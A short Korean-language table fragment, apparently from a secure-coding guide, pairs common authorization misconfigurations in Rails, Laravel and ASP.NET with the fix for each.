| Rails | `skip_before_action` 과도한 범위 | 명시적 `only:` 목록으로 제한 |
| Laravel | `Gate::before` 무조건 true | 슈퍼유저 체크를 before에서 분리 |
| ASP.NET | `[AllowAnonymous]` on action | 필요 최소 범위에만 적용, 인가 정책 점검 |
